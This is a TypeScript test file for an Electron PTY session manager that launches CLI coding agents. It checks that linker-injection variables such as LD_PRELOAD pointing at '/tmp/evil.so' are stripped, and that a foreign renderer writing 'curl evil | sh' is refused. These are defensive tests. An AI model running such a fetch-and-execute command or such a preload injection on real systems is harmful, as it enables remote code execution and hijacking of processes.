import { describe, expect, it, vi } from 'vitest';
import type { WebContents } from 'electron';
import {
  agentEnv,
  getSessionState,
  killSession,
  setPtyHost,
  spawnAgentSession,
  spawnSession,
  writeSession,
} from './pty-manager';
import type { PtyHost, PtyProcHandle, PtySpawnSpec } from './pty-host-core';
import type { CliPtyAdapter } from '../../shared/adapter-types';

// A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
// `env` block matters here; the rest satisfies the type.
function makeAdapter(
  env: CliPtyAdapter['env'],
  spawnPatch: Partial<CliPtyAdapter['spawn']> = {},
): CliPtyAdapter {
  return {
    kind: 'cli-pty',
    id: 'test-cli',
    label: 'Test CLI',
    version: '1.0.0',
    icon: '🤖',
    bin: 'test-cli',
    detect: 'test-cli --version',
    install: { method: 'npm', command: 'npm install -g test-cli' },
    auth: { method: 'none' },
    spawn: {
      interactive: ['test-cli'],
      headless: ['test-cli', '--prompt', '{{PROMPT}}'],
      ptyRequired: true,
      resumeArgs: [],
      extraArgs: [],
      ...spawnPatch,
    },
    env,
    models: { flag: '--model', list: ['default'], default: 'default' },
    promptInjection: { method: 'arg', trailingNewline: true, bracketedPaste: false },
    stateParsing: {
      idle: { type: 'timeout', ms: 500 },
      shellIntegration: false,
      exitCodes: {},
    },
    quirks: { altScreen: false, requiresNoAutoUpdate: false, mcpAutoload: false },
    control: {},
  } as CliPtyAdapter;
}

describe('agentEnv linker-injection guard (plugin trust boundary)', () => {
  it('drops DYLD_ keys from env.static', () => {
    const env = agentEnv(
      makeAdapter({
        static: { DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib', SAFE_VAR: 'ok' },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
    expect(env.SAFE_VAR).toBe('ok');
  });

  it('drops LD_ keys from env.static', () => {
    const env = agentEnv(
      makeAdapter({
        static: { LD_PRELOAD: '/tmp/evil.so', LD_LIBRARY_PATH: '/tmp' },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
  });

  it('drops DYLD_/LD_ keys from env.passthrough even if present in process.env', () => {
    process.env.DYLD_TEST_INJECT = 'x';
    process.env.LD_TEST_INJECT = 'y';
    try {
      const env = agentEnv(
        makeAdapter({
          static: {},
          passthrough: ['DYLD_TEST_INJECT', 'LD_TEST_INJECT'],
          ephemeralHome: false,
        }),
      );
      expect(env.DYLD_TEST_INJECT).toBeUndefined();
      expect(env.LD_TEST_INJECT).toBeUndefined();
    } finally {
      delete process.env.DYLD_TEST_INJECT;
      delete process.env.LD_TEST_INJECT;
    }
  });

  it('keeps ordinary static and passthrough vars', () => {
    process.env.NEXUS_TEST_TOKEN = 'secret';
    try {
      const env = agentEnv(
        makeAdapter({
          static: { FOO: 'bar' },
          passthrough: ['NEXUS_TEST_TOKEN'],
          ephemeralHome: false,
        }),
      );
      expect(env.FOO).toBe('bar');
      expect(env.NEXUS_TEST_TOKEN).toBe('secret');
    } finally {
      delete process.env.NEXUS_TEST_TOKEN;
    }
  });
});

// A WebContents stub that always accepts sends (canSend passes).
function fakeWc(): WebContents {
  return {
    isDestroyed: () => false,
    isCrashed: () => false,
    send: () => {},
  } as unknown as WebContents;
}

// Records the per-session proxy so a test can see which control calls fired.
function fakeHost(): {
  host: PtyHost;
  procFor: (id: string) => PtyProcHandle;
  specFor: (id: string) => PtySpawnSpec;
} {
  const procs = new Map<string, PtyProcHandle>();
  const specs = new Map<string, PtySpawnSpec>();
  return {
    host: {
      spawn(spec) {
        const proc: PtyProcHandle = {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
        };
        specs.set(spec.sessionId, spec);
        procs.set(spec.sessionId, proc);
        return proc;
      },
    },
    procFor: (id) => procs.get(id)!,
    specFor: (id) => specs.get(id)!,
  };
}

describe('PTY session ownership (renderer capability boundary)', () => {
  it('only the owning WebContents can write to / kill a session', () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();

    const { sessionId } = spawnSession(owner, { kind: 'shell', cols: 80, rows: 24 });
    const proc = h.procFor(sessionId);

    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
    writeSession(attacker, sessionId, 'curl evil | sh\n');
    expect(proc.write).not.toHaveBeenCalled();

    // The owner writes normally.
    writeSession(owner, sessionId, 'ls\n');
    expect(proc.write).toHaveBeenCalledWith('ls\n');

    // A foreign kill is a no-op; the session stays live.
    killSession(attacker, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(getSessionState(sessionId)).not.toBeNull();

    // The owner kills it.
    killSession(owner, sessionId);
    expect(proc.kill).toHaveBeenCalledTimes(1);
    expect(getSessionState(sessionId)).toBeNull();
  });
});

describe('cli-agent spawn argv hardening', () => {
  it('appends adapter-declared extra args after user overrides', () => {
    const h = fakeHost();
    setPtyHost(h.host);

    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      { extraArgs: ['--disallowedTools', 'Task'] },
    );

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: 'cli-agent', cols: 80, rows: 24 },
      adapter,
      { extraArgs: ['--user-flag'] },
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).toContain('--user-flag');
    expect(spec.args.slice(-2)).toEqual(['--disallowedTools', 'Task']);
  });

  it('lets Kimi transient-model env choose the API model without an overriding --model', () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: 'kimi',
      bin: 'kimi',
      spawn: { ...base.spawn, interactive: ['kimi'] },
      models: {
        flag: '--model',
        list: ['kimi-code/kimi-for-coding'],
        default: 'kimi-code/kimi-for-coding',
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: 'cli-agent',
        adapterId: 'kimi',
        model: 'kimi-code/kimi-for-coding',
        cols: 80,
        rows: 24,
      },
      adapter,
      {
        keyEnv: {
          KIMI_MODEL_API_KEY: 'sk-kimi-test',
          KIMI_MODEL_NAME: 'kimi-for-coding',
        },
      },
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).not.toContain('--model');
    expect(spec.env.KIMI_MODEL_API_KEY).toBe('sk-kimi-test');
    expect(spec.env.KIMI_MODEL_NAME).toBe('kimi-for-coding');
  });

  it('normalizes the legacy Kimi OAuth model alias before adding --model', () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: 'kimi',
      bin: 'kimi',
      spawn: { ...base.spawn, interactive: ['kimi'] },
      models: {
        flag: '--model',
        list: ['kimi-code/kimi-for-coding'],
        default: 'kimi-code/kimi-for-coding',
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: 'cli-agent',
        adapterId: 'kimi',
        model: 'kimi-for-coding',
        cols: 80,
        rows: 24,
      },
      adapter,
    );

    expect(h.specFor(sessionId).args).toEqual([
      '--model',
      'kimi-code/kimi-for-coding',
    ]);
  });

  it('passes only provider-qualified OpenCode model ids', () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: 'opencode',
      bin: 'opencode',
      spawn: { ...base.spawn, interactive: ['opencode'] },
      models: {
        flag: '--model',
        list: ['opencode/big-pickle'],
        default: 'opencode/big-pickle',
      },
    };

    const valid = spawnAgentSession(
      fakeWc(),
      {
        kind: 'cli-agent',
        adapterId: 'opencode',
        model: 'opencode/big-pickle',
        cols: 80,
        rows: 24,
      },
      adapter,
    );
    const stale = spawnAgentSession(
      fakeWc(),
      {
        kind: 'cli-agent',
        adapterId: 'opencode',
        model: 'claude-sonnet-5',
        cols: 80,
        rows: 24,
      },
      adapter,
    );

    expect(h.specFor(valid.sessionId).args).toEqual([
      '--model',
      'opencode/big-pickle',
    ]);
    expect(h.specFor(stale.sessionId).args).toEqual([]);
  });
});
